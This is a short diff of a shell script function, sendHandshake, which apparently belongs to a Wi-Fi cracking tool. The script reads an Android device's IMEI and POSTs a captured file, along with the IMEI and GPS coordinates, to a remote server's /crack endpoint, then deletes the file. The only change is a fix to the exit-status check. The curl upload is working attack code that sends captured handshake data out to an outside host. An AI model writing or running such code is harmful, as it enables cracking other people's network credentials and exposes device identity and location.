@@ -24,7 +24,7 @@ sendHandshake() {
   imei=`chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'`
   echo "IMEI: "$imei
   curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
-  if [[ $! == 0 ]]; then
+  if [[ $? == 0 ]]; then
     rm $1
   else
     echo "Failed send file $1"
